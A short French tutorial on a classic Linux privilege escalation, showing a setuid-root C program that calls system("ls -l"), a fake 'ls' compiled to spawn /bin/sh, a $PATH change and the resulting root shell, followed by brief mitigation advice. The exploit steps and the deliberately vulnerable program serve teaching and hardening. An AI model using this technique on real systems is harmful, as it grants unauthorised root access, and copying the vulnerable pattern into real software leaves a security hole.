# System()

## I. Introduction
La fonction `system()` de Linux permet d'éxécuter une commande passée en argument. Pour savoir où se trouve le fichier à lancer, `system()` utilise la variable d'environnement `$PATH`. Il suffit donc d'agir sur cette variable pour faire executer à `system` le mauvais programme.

## II. Pré-requis
* Un programme suid
* L'argument de `system()` n'est pas un chemin absolu.


```{r, engine='bash'}
aas@ubuntu:~$ cat vuln.c
void main()
{
  system("ls -l");
}
```

Le comportement normal de ce programme est le suivant. Notons le suid activé.


```{r, engine='bash'}
aas@ubuntu:~$ ./vuln
total 48
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Desktop
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Documents
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Downloads
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Music
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Pictures
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Public
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Templates
drwxr-xr-x 2 aas  aas  4096 sept. 16 09:45 Videos
-rws--x--x 1 root root 8600 sept. 16 10:07 vuln
-rw-rw-r-- 1 aas  aas    34 sept. 16 10:07 vuln.c 
```

## III. Exploitation
### Création d'un faux programme 'ls' ouvrant un shell.
```{r, engine='bash'}
aas@ubuntu:~$ cat exploit.c 
void main()
{
  char *shell[] = {"/bin/sh",NULL};
  execve(shell[0],shell,NULL);
}
aas@ubuntu:~$ gcc exploit.c -o ls
```


### Modification de $PATH

```{r, engine='bash'}
aas@ubuntu:~$ PATH=.:$PATH
```
On ajoute le repertoire contenant notre faux programme `ls` en première position de la variable `$PATH`

### Execution
```{r, engine='bash'}
aas@ubuntu:~$ ./vuln 
```
```
# whoami
root
```
Pour executer `ls`, `system()` cherche en premier dans notre repertoire courant au lieu de `/bin/`, lance notre faux `ls`, qui lance un shell root puisque notre programme `vuln` est suid.
    
## IV. Sécurisation
Mettre le chemin absolu avec `system()` ne suffit pas puisqu'il est possible d'utiliser la faille IFS sur certains "anciens" noyaux.  
Il faut donc utiliser les fonctions type `execve()` et bannir `System()`.

